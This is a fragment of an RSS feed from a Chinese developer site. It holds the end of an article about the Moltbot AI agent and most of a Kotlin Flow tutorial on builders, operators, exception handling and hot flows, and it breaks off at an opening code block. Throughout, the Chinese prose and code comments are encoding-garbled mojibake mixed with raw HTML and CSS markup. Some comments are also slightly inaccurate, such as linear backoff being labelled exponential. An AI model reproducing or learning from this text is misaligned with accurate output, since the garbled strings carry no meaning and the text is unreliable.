<p>Moltbot ç°åœ¨è¿˜æ—©æœŸï¼Œbug å¤šã€é…ç½®éº»çƒ¦ã€ç”Ÿæ€ä¹Ÿä¸æˆç†Ÿã€‚å®ƒä¸æ˜¯é‚£ç§è£…ä¸Šå°±èƒ½çˆ½ç”¨çš„äº§å“ã€‚</p>
<p>ä½†å®ƒç¡®å®æŠŠæ–¹å‘æŒ‡å¾—å¾ˆæ¸…æ¥šï¼š</p>
<p><b>AI ä¸åº”è¯¥è¢«å›°åœ¨èŠå¤©æ¡†é‡Œã€‚</b></p>
<p>å®ƒåº”è¯¥è¿›ç³»ç»Ÿã€è¿›æµç¨‹ã€è¿›ç¾¤èŠã€è¿›åå°ï¼Œåƒç©ºæ°”ä¸€æ ·å­˜åœ¨ã€‚</p>
<p><b>å®ƒä¸å®Œç¾ï¼Œä½†å®ƒå¾ˆå±é™©ï¼Œä¹Ÿå¾ˆè¿·äººã€‚</b></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin flowçš„ç®€å•äº†è§£]]></title>    <link>https://juejin.cn/post/7600560664407425087</link>    <guid>https://juejin.cn/post/7600560664407425087</guid>    <pubDate>2026-01-29T08:44:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600560664407425087" data-draft-id="7600333405979852841" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin flowçš„ç®€å•äº†è§£"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-29T08:44:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Yen"/> <meta itemprop="url" content="https://juejin.cn/user/4037062426633214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin flowçš„ç®€å•äº†è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4037062426633214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Yen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:44:41.000Z" title="Thu Jan 29 2026 08:44:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€ç®€å•ç”¨æ³•</h2>
<h3 data-id="heading-1">1. Flow æ¦‚è¿°</h3>
<p>Flow æ˜¯ Kotlin åç¨‹åº“ä¸­ç”¨äºå¤„ç†å¼‚æ­¥æ•°æ®æµçš„ APIï¼Œç±»ä¼¼äº RxJava çš„ Observableï¼Œä½†æ›´è½»é‡ä¸”ä¸åç¨‹æ·±åº¦é›†æˆã€‚</p>
<h4 data-id="heading-2">ä¸»è¦ç‰¹ç‚¹ï¼š</h4>
<ul>
<li><strong>å†·æµï¼ˆCold Streamï¼‰</strong> ï¼šæ¶ˆè´¹è€…è§¦å‘æ—¶æ‰æ‰§è¡Œ</li>
<li><strong>åŸºäºåç¨‹</strong>ï¼šå¤©ç„¶æ”¯æŒæŒ‚èµ·å‡½æ•°</li>
<li><strong>å“åº”å¼ç¼–ç¨‹</strong>ï¼šæ”¯æŒå‡½æ•°å¼æ“ä½œç¬¦</li>
<li><strong>ç»“æ„åŒ–å¹¶å‘</strong>ï¼šè‡ªåŠ¨å–æ¶ˆå’Œèµ„æºæ¸…ç†</li>
</ul>
<h3 data-id="heading-3">2. Flow çš„åˆ›å»º</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. flow {} æ„å»ºå™¨</span>
<span class="hljs-keyword">val</span> flow1 = flow {
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        delay(<span class="hljs-number">100</span>) <span class="hljs-comment">// æŒ‚èµ·å‡½æ•°</span>
        emit(i)    <span class="hljs-comment">// å‘å°„å€¼</span>
    }
}

<span class="hljs-comment">// 2. asFlow() æ‰©å±•å‡½æ•°</span>
<span class="hljs-keyword">val</span> flow2 = listOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>).asFlow()
<span class="hljs-keyword">val</span> flow3 = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()

<span class="hljs-comment">// 3. flowOf()</span>
<span class="hljs-keyword">val</span> flow4 = flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)

<span class="hljs-comment">// 4. channelFlow - æ”¯æŒå¤æ‚å¼‚æ­¥åœºæ™¯</span>
<span class="hljs-keyword">val</span> flow5 = channelFlow {
    send(<span class="hljs-number">1</span>)
    withContext(Dispatchers.IO) {
        send(<span class="hljs-number">2</span>)
    }
}
</code></pre>
<h3 data-id="heading-4">3. Flow æ“ä½œç¬¦</h3>
<h4 data-id="heading-5">ä¸­é—´æ“ä½œç¬¦ï¼ˆIntermediate Operatorsï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// è½¬æ¢æ“ä½œ</span>
flow.map { it * <span class="hljs-number">2</span> }                    <span class="hljs-comment">// æ˜ å°„</span>
flow.filter { it &gt; <span class="hljs-number">5</span> }                 <span class="hljs-comment">// è¿‡æ»¤</span>
flow.transform { value -&gt;
    emit(<span class="hljs-string">"Value: <span class="hljs-variable">$value</span>"</span>)
    emit(value * <span class="hljs-number">10</span>)
}

<span class="hljs-comment">// é™é•¿æ“ä½œ</span>
flow.take(<span class="hljs-number">2</span>)                           <span class="hljs-comment">// å–å‰ä¸¤ä¸ª</span>
flow.takeWhile { it &lt; <span class="hljs-number">3</span> }              <span class="hljs-comment">// æ¡ä»¶å–</span>

<span class="hljs-comment">// ç»„åˆæ“ä½œ</span>
<span class="hljs-keyword">val</span> flowA = flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
<span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>)

flowA.zip(flowB) { a, b -&gt; <span class="hljs-string">"<span class="hljs-variable">$a</span> -&gt; <span class="hljs-variable">$b</span>"</span> } <span class="hljs-comment">// å‹ç¼©</span>
flowA.combine(flowB) { a, b -&gt; <span class="hljs-string">"<span class="hljs-variable">$a</span> - <span class="hljs-variable">$b</span>"</span> } <span class="hljs-comment">// ç»„åˆï¼ˆæœ€æ–°å€¼ï¼‰</span>

<span class="hljs-comment">// å±•å¹³æ“ä½œ</span>
flow.flatMapConcat { value -&gt;          <span class="hljs-comment">// é¡ºåºè¿æ¥</span>
    flowOf(value, value * <span class="hljs-number">2</span>)
}
flow.flatMapMerge { value -&gt;           <span class="hljs-comment">// å¹¶å‘åˆå¹¶</span>
    flow {
        delay(<span class="hljs-number">100</span>)
        emit(value)
    }
}
flow.flatMapLatest { value -&gt;          <span class="hljs-comment">// æœ€æ–°å€¼</span>
    flow {
        delay(<span class="hljs-number">100</span>)
        emit(value)
    }
}
</code></pre>
<h4 data-id="heading-6">ç»ˆç«¯æ“ä½œç¬¦ï¼ˆTerminal Operatorsï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æ”¶é›†å€¼</span>
flow.collect { value -&gt;
    println(value)
}

<span class="hljs-comment">// è½¬æ¢ä¸ºé›†åˆ</span>
<span class="hljs-keyword">val</span> list = flow.toList()
<span class="hljs-keyword">val</span> <span class="hljs-keyword">set</span> = flow.toSet()

<span class="hljs-comment">// èšåˆæ“ä½œ</span>
<span class="hljs-keyword">val</span> sum = flow.reduce { acc, value -&gt; acc + value }
<span class="hljs-keyword">val</span> sum2 = flow.fold(<span class="hljs-number">0</span>) { acc, value -&gt; acc + value }

<span class="hljs-comment">// è·å–å•ä¸ªå€¼</span>
<span class="hljs-keyword">val</span> first = flow.first()
<span class="hljs-keyword">val</span> firstOrNull = flow.firstOrNull()
<span class="hljs-keyword">val</span> single = flow.single()  <span class="hljs-comment">// ç¡®ä¿åªæœ‰ä¸€ä¸ªå€¼</span>

<span class="hljs-comment">// è®¡æ•°</span>
<span class="hljs-keyword">val</span> count = flow.count()
</code></pre>
<h3 data-id="heading-7">4. å¼‚å¸¸å¤„ç†</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// catch æ“ä½œç¬¦</span>
flow.<span class="hljs-keyword">catch</span> { cause -&gt;
    println(<span class="hljs-string">"Caught exception: <span class="hljs-variable">$cause</span>"</span>)
    emit(-<span class="hljs-number">1</span>)  <span class="hljs-comment">// å‘å°„å¤‡ç”¨å€¼</span>
}.collect { value -&gt;
    println(value)
}

<span class="hljs-comment">// å£°æ˜å¼å¼‚å¸¸å¤„ç†</span>
flow.onCompletion { cause -&gt;
    cause?.let { println(<span class="hljs-string">"Flow completed exceptionally: <span class="hljs-variable">$it</span>"</span>) }
        ?: println(<span class="hljs-string">"Flow completed successfully"</span>)
}

<span class="hljs-comment">// ç¤ºä¾‹ï¼šå¤šå±‚æ•è·</span>
flow
    .map { it * <span class="hljs-number">2</span> }
    .<span class="hljs-keyword">catch</span> { emit(-<span class="hljs-number">1</span>) }  <span class="hljs-comment">// åªæ•è·ä¸Šæ¸¸å¼‚å¸¸</span>
    .collect { value -&gt;
        <span class="hljs-keyword">try</span> {
            println(value)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            <span class="hljs-comment">// å¤„ç†æ”¶é›†ç«¯å¼‚å¸¸</span>
        }
    }
</code></pre>
<h3 data-id="heading-8">5. ä¸Šä¸‹æ–‡å’Œçº¿ç¨‹åˆ‡æ¢</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// flowOn - æŒ‡å®šä¸Šæ¸¸æ“ä½œçš„ä¸Šä¸‹æ–‡</span>
flow
    .map { it * <span class="hljs-number">2</span> }                    <span class="hljs-comment">// åœ¨ IO çº¿ç¨‹æ‰§è¡Œ</span>
    .flowOn(Dispatchers.IO)
    .collect { value -&gt;                <span class="hljs-comment">// åœ¨è°ƒç”¨è€…ä¸Šä¸‹æ–‡æ‰§è¡Œ</span>
        println(value)
    }

<span class="hljs-comment">// é”™è¯¯ç¤ºä¾‹ï¼šä¸è¦åœ¨ flow æ„å»ºå™¨ä¸­åˆ‡æ¢ä¸Šä¸‹æ–‡</span>
<span class="hljs-keyword">val</span> wrongFlow = flow {
    withContext(Dispatchers.IO) {      <span class="hljs-comment">// âŒ é”™è¯¯ï¼</span>
        emit(<span class="hljs-number">1</span>)
    }
}

<span class="hljs-comment">// æ­£ç¡®åšæ³•ï¼šä½¿ç”¨ channelFlow æˆ– flowOn</span>
<span class="hljs-keyword">val</span> correctFlow = flow {
    emit(<span class="hljs-number">1</span>)
}.flowOn(Dispatchers.IO)
</code></pre>
<h3 data-id="heading-9">6. èƒŒå‹ï¼ˆBackpressureï¼‰å¤„ç†</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ç¼“å†²</span>
flow.buffer()                          <span class="hljs-comment">// é»˜è®¤ç¼“å†²</span>
flow.buffer(<span class="hljs-number">10</span>)                        <span class="hljs-comment">// æŒ‡å®šç¼“å†²å¤§å°</span>

<span class="hljs-comment">// åˆå¹¶ï¼ˆè·³è¿‡ä¸­é—´å€¼ï¼‰</span>
flow.conflate()                        <span class="hljs-comment">// åªå¤„ç†æœ€æ–°å€¼</span>

<span class="hljs-comment">// æ”¶é›†æœ€æ–°å€¼</span>
flow.collectLatest { value -&gt;
    <span class="hljs-comment">// å¦‚æœæ–°å€¼åˆ°è¾¾ï¼Œå–æ¶ˆå½“å‰å¤„ç†</span>
    delay(<span class="hljs-number">300</span>)  <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ</span>
    println(value)
}
</code></pre>
<h3 data-id="heading-10">7. çƒ­æµï¼ˆHot Flowï¼‰</h3>
<h4 data-id="heading-11">SharedFlow</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// åˆ›å»º SharedFlow</span>
<span class="hljs-keyword">val</span> sharedFlow = MutableSharedFlow&lt;<span class="hljs-built_in">Int</span>&gt;(
    replay = <span class="hljs-number">2</span>,          <span class="hljs-comment">// æ–°è®¢é˜…è€…æ¥æ”¶çš„å†å²å€¼æ•°é‡</span>
    extraBufferCapacity = <span class="hljs-number">10</span>  <span class="hljs-comment">// é¢å¤–ç¼“å†²</span>
)

<span class="hljs-comment">// å‘å°„å€¼</span>
viewModelScope.launch {
    sharedFlow.emit(<span class="hljs-number">1</span>)
}

<span class="hljs-comment">// æ”¶é›†å€¼</span>
sharedFlow.collect { value -&gt;
    println(<span class="hljs-string">"Collector 1: <span class="hljs-variable">$value</span>"</span>)
}

<span class="hljs-comment">// shareIn - å°†å†·æµè½¬ä¸ºçƒ­æµ</span>
<span class="hljs-keyword">val</span> coldFlow = flow {
    repeat(<span class="hljs-number">10</span>) {
        emit(it)
        delay(<span class="hljs-number">100</span>)
    }
}

<span class="hljs-keyword">val</span> hotFlow = coldFlow.shareIn(
    scope = viewModelScope,
    started = SharingStarted.WhileSubscribed(),  <span class="hljs-comment">// è®¢é˜…æ—¶å¼€å§‹</span>
    replay = <span class="hljs-number">1</span>
)

<span class="hljs-comment">// started å‚æ•°é€‰é¡¹ï¼š</span>
<span class="hljs-comment">// SharingStarted.Eagerly    - ç«‹å³å¼€å§‹</span>
<span class="hljs-comment">// SharingStarted.Lazily     - ç¬¬ä¸€ä¸ªè®¢é˜…è€…å‡ºç°æ—¶å¼€å§‹</span>
<span class="hljs-comment">// SharingStarted.WhileSubscribed() - æœ‰è®¢é˜…è€…æ—¶å¼€å§‹</span>
</code></pre>
<h4 data-id="heading-12">StateFlow</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// åˆ›å»º StateFlow</span>
<span class="hljs-keyword">val</span> stateFlow = MutableStateFlow(<span class="hljs-number">0</span>)  <span class="hljs-comment">// éœ€è¦åˆå§‹å€¼</span>

<span class="hljs-comment">// æ›´æ–°å€¼ï¼ˆè‡ªåŠ¨å»é‡ï¼‰</span>
stateFlow.value = <span class="hljs-number">1</span>
stateFlow.tryEmit(<span class="hljs-number">2</span>)

<span class="hljs-comment">// æ”¶é›†å€¼ï¼ˆè‡ªåŠ¨æ¥æ”¶æœ€æ–°å€¼å’Œåç»­æ›´æ–°ï¼‰</span>
stateFlow.collect { value -&gt;
    println(<span class="hljs-string">"Current state: <span class="hljs-variable">$value</span>"</span>)
}

<span class="hljs-comment">// stateIn - å°† Flow è½¬æ¢ä¸º StateFlow</span>
<span class="hljs-keyword">val</span> state = flow {
    emit(<span class="hljs-number">1</span>)
    delay(<span class="hljs-number">1000</span>)
    emit(<span class="hljs-number">2</span>)
}.stateIn(
    scope = viewModelScope,
    started = SharingStarted.WhileSubscribed(<span class="hljs-number">5000</span>),  <span class="hljs-comment">// 5ç§’åæ— è®¢é˜…è€…åœæ­¢</span>
    initialValue = <span class="hljs-number">0</span>
)
</code></pre>
<h3 data-id="heading-13">8. Flow ç”Ÿå‘½å‘¨æœŸ</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">flow
    .onStart { 
        println(<span class="hljs-string">"Flow started"</span>) 
    }
    .onEach { value -&gt;
        println(<span class="hljs-string">"Emitted: <span class="hljs-variable">$value</span>"</span>)
    }
    .onCompletion { cause -&gt;
        cause?.let { println(<span class="hljs-string">"Completed with exception: <span class="hljs-variable">$it</span>"</span>) }
            ?: println(<span class="hljs-string">"Completed successfully"</span>)
    }
    .<span class="hljs-keyword">catch</span> { cause -&gt;
        println(<span class="hljs-string">"Caught: <span class="hljs-variable">$cause</span>"</span>)
    }
    .collect()
</code></pre>
<h3 data-id="heading-14">9. å®é™…åº”ç”¨ç¤ºä¾‹</h3>
<h4 data-id="heading-15">ç¤ºä¾‹ 1ï¼šç½‘ç»œè¯·æ±‚é‡è¯•</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchDataWithRetry</span><span class="hljs-params">()</span></span>: Flow&lt;Result&gt; = flow {
    <span class="hljs-keyword">var</span> retryCount = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">val</span> result = api.fetchData()
            emit(Result.Success(result))
            <span class="hljs-keyword">break</span>
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            retryCount++
            <span class="hljs-keyword">if</span> (retryCount &gt; MAX_RETRIES) {
                emit(Result.Error(e))
                <span class="hljs-keyword">break</span>
            }
            delay(retryCount * <span class="hljs-number">1000L</span>)  <span class="hljs-comment">// æŒ‡æ•°é€€é¿</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-16">ç¤ºä¾‹ 2ï¼šæœç´¢é˜²æŠ–</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">search</span><span class="hljs-params">(queryFlow: <span class="hljs-type">Flow</span>&lt;<span class="hljs-type">String</span>&gt;)</span></span>: Flow&lt;List&lt;Result&gt;&gt; = queryFlow
    .debounce(<span class="hljs-number">300</span>)                    <span class="hljs-comment">// é˜²æŠ– 300ms</span>
    .distinctUntilChanged()           <span class="hljs-comment">// å»é‡</span>
    .filter { it.length &gt;= <span class="hljs-number">2</span> }        <span class="hljs-comment">// æœ€å°é•¿åº¦</span>
    .flatMapLatest { query -&gt;         <span class="hljs-comment">// å–æ¶ˆå‰ä¸€ä¸ªæœç´¢</span>
        <span class="hljs-keyword">if</span> (query.isEmpty()) {
            flowOf(emptyList())
        } <span class="hljs-keyword">else</span> {
            flow {
                emit(emptyList&lt;Result&gt;())  <span class="hljs-comment">// æ˜¾ç¤ºåŠ è½½çŠ¶æ€</span>
                <span class="hljs-keyword">val</span> results = api.search(query)
                emit(results)
            }.<span class="hljs-keyword">catch</span> { emit(emptyList()) }  <span class="hljs-comment">// é”™è¯¯æ—¶è¿”å›ç©º</span>
        }
    }
    .flowOn(Dispatchers.IO)
</code></pre>
<h4 data-id="heading-17">ç¤ºä¾‹ 3ï¼šç»„åˆå¤šä¸ªæ•°æ®æº</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">observeUserData</span><span class="hljs-params">(userId: <span class="hljs-type">String</span>)</span></span>: Flow&lt;UserData&gt; {
    <span class="hljs-keyword">val</span> localFlow = database.observeUser(userId)
    <span class="hljs-keyword">val</span> remoteFlow = api.getUserStream(userId)
    
    <span class="hljs-keyword">return</span> merge(localFlow, remoteFlow)
        .distinctUntilChanged()
        .onEach { user -&gt;
            database.saveUser(user)
        }
}
</code></pre>
<h3 data-id="heading-18">10. æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. é¿å…ä¸å¿…è¦çš„ä¸­é—´æ“ä½œ</span>
flow
    .filter { it &gt; <span class="hljs-number">0</span> }     <span class="hljs-comment">// å°½æ—©è¿‡æ»¤å‡å°‘åç»­æ“ä½œ</span>
    .map { it * <span class="hljs-number">2</span> }

<span class="hljs-comment">// 2. åˆç†ä½¿ç”¨ buffer</span>
flow
    .buffer()              <span class="hljs-comment">// ç”Ÿäº§å’Œæ¶ˆè´¹å¹¶å‘æ‰§è¡Œ</span>
    .collect { value -&gt;
        delay(<span class="hljs-number">100</span>)         <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ¶ˆè´¹</span>
        println(value)
    }

<span class="hljs-comment">// 3. ä½¿ç”¨ shareIn/stateIn é¿å…é‡å¤è®¡ç®—</span>
<span class="hljs-keyword">val</span> sharedData = expensiveFlow
    .shareIn(scope, SharingStarted.Lazily)

<span class="hljs-comment">// 4. é€‚æ—¶å–æ¶ˆä¸å¿…è¦çš„æµ</span>
scope.launch {
    withTimeout(<span class="hljs-number">5000</span>) {
        flow.collect { value -&gt;
            <span class="hljs-keyword">if</span> (value == TARGET) {
                <span class="hljs-keyword">return</span><span class="hljs-symbol">@withTimeout</span>  <span class="hljs-comment">// æ‰¾åˆ°ç›®æ ‡åå–æ¶ˆ</span>
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-19">11. å¸¸è§é™·é˜±å’Œæœ€ä½³å®è·µ</h3>
<h4 data-id="heading-20">é™·é˜±ï¼š</h4>
<ul>
<li><strong>åœ¨ flow æ„å»ºå™¨ä¸­ä½¿ç”¨ withContext</strong>Â âŒ</li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// é”™è¯¯</span>
flow { withContext(Dispatchers.IO) { emit(<span class="hljs-number">1</span>) } }

<span class="hljs-comment">// æ­£ç¡®</span>
flow { emit(<span class="hljs-number">1</span>) }.flowOn(Dispatchers.IO)
</code></pre>
<ul>
<li><strong>æ•è·å¼‚å¸¸ä½ç½®ä¸å½“</strong></li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// catch åªèƒ½æ•è·ä¸Šæ¸¸å¼‚å¸¸</span>
flow.<span class="hljs-keyword">catch</span> { <span class="hljs-comment">/* æ•è·ä¸Šæ¸¸å¼‚å¸¸ */</span> }
    .collect { 
        <span class="hljs-keyword">try</span> { <span class="hljs-comment">/* å¤„ç†æ”¶é›†ç«¯é€»è¾‘ */</span> } 
        <span class="hljs-keyword">catch</span>(e: Exception) { <span class="hljs-comment">/* æ•è·æ”¶é›†ç«¯å¼‚å¸¸ */</span> }
    }
</code></pre>
<ul>
<li><strong>å¿˜è®°å¤„ç†å–æ¶ˆ</strong></li>
</ul>
<pre><code class="hljs language-kotlin" lang="kotlin">flow {
    emit(<span class="hljs-number">1</span>)
    delay(<span class="hljs-number">1000</span>)
    emit(<span class="hljs-number">2</span>)  <span class="hljs-comment">// å¦‚æœ flow è¢«å–æ¶ˆï¼Œè¿™é‡Œä¸ä¼šæ‰§è¡Œ</span>
}.cancellable()  <span class="hljs-comment">// è®© flow å¯å“åº”å–æ¶ˆ</span>
</code></pre>
<h4 data-id="heading-21">æœ€ä½³å®è·µï¼š</h4>
<ul>
<li>ä½¿ç”¨Â <code>flowOn</code>Â è¿›è¡Œçº¿ç¨‹åˆ‡æ¢</li>
<li>åˆç†ä½¿ç”¨Â <code>catch</code>Â è¿›è¡Œå¼‚å¸¸å¤„ç†</li>
<li>ä½¿ç”¨Â <code>shareIn</code>/<code>stateIn</code>Â å…±äº«çƒ­æµ</li>
<li>ä¸ºè€—æ—¶æ“ä½œæ·»åŠ ç¼“å†²</li>
<li>åŠæ—¶å–æ¶ˆä¸å†éœ€è¦çš„æµ</li>
</ul>
<p>Flow æ˜¯ Kotlin å¼‚æ­¥ç¼–ç¨‹çš„å¼ºå¤§å·¥å…·ï¼Œé€šè¿‡åˆç†ä½¿ç”¨å„ç§æ“ä½œç¬¦å’Œæ¨¡å¼ï¼Œå¯ä»¥æ„å»ºå‡ºé«˜æ•ˆã€å¯ç»´æŠ¤çš„å¼‚æ­¥æ•°æ®æµã€‚</p>
<h2 data-id="heading-22">äºŒã€æ·±å…¥ç†è§£</h2>
<h3 data-id="heading-23">1. Flow çš„æ•´ä½“æ¶æ„</h3>
<h4 data-id="heading-24">1.1 Flow æ¥å£ä½“ç³»</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Flow æ ¸å¿ƒæ¥å£</span>
